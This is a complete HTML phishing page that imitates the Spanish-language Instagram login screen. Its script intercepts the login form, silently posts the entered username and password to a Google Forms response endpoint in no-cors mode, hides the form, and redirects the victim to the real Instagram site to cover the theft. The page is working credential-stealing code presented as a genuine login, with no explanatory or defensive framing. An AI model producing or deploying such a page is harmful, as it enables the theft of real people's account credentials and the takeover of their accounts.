<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Iniciar sesión - Instagram</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Arial', sans-serif;
    }

    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #fafafa;
    }

    .login-container {
      background: white;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
      text-align: center;
      width: 300px;
      font-size: 12px;
    }

    .logo {
      width: 150px;
      margin-bottom: 15px;
    }

    .input-container {
      position: relative;
      width: 100%;
      margin-top: 10px;
    }

    .input-container input {
      width: 100%;
      padding: 10px 12px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 12px;
      background: #fafafa;
      outline: none;
    }

    .input-container label {
      position: absolute;
      top: 50%;
      left: 12px;
      transform: translateY(-50%);
      font-size: 12px;
      color: #aaa;
      transition: all 0.3s ease-in-out;
      pointer-events: none;
    }

    .input-container input:focus + label,
    .input-container input:not(:placeholder-shown) + label {
      top: 5px;
      left: 10px;
      font-size: 10px;
      color: #aaa;
    }

    .password-container {
      position: relative;
      display: flex;
      align-items: center;
    }

    .toggle-password {
      position: absolute;
      right: 12px;
      background: none;
      border: none;
      font-size: 12px;
      cursor: pointer;
      color: #aaa;
    }

    .submit-btn {
      width: 100%;
      padding: 10px;
      background-color: #3897f0;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 14px;
      margin-top: 10px;
      font-weight: normal;
      transition: background 0.3s;
    }

    .submit-btn:hover {
      background-color: #2674c8;
    }

    .forgot-password {
      margin-top: 10px;
    }

    .forgot-password a {
      color: #3897f0;
      text-decoration: none;
      font-size: 12px;
    }

    .forgot-password a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

<div class="login-container" id="loginBox">
  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram" class="logo">
  
  <form id="myForm">
    <div class="input-container">
      <input type="text" id="username" name="entry.1271603301" placeholder=" " required>
      <label for="username">Teléfono, usuario o correo electrónico</label>
    </div>

    <div class="input-container password-container">
      <input type="password" id="password" name="entry.1257754249" placeholder=" " required>
      <label for="password">Contraseña</label>
      <button type="button" class="toggle-password" onclick="togglePassword()">Mostrar</button>
    </div>

    <button type="submit" class="submit-btn">Entrar</button>
  </form>

  <div class="forgot-password">
    <a href="https://www.instagram.com/accounts/password/reset/" target="_blank">¿Has olvidado la contraseña?</a>
  </div>
</div>

<script>
  function togglePassword() {
    const passwordInput = document.getElementById("password");
    const toggleButton = document.querySelector(".toggle-password");

    if (passwordInput.type === "password") {
      passwordInput.type = "text";
      toggleButton.textContent = "Ocultar";
    } else {
      passwordInput.type = "password";
      toggleButton.textContent = "Mostrar";
    }
  }

  document.getElementById("myForm").addEventListener("submit", function(event) {
    event.preventDefault();
    
    // Oculta el formulario instantáneamente
    document.getElementById("loginBox").style.opacity = "0";

    // Envía los datos sin esperar respuesta
    const form = new FormData(this);
    fetch("https://docs.google.com/forms/d/e/1FAIpQLScixbdWi6SxI01JD38odY0Vr0p0ShZB4P51zkqwcBNwFIHjxw/formResponse", {
      method: "POST",
      body: form,
      mode: "no-cors"
    });

    // Redirige a Instagram sin retraso
    window.location.href = "https://www.instagram.com";
  });
</script>

</body>
</html>
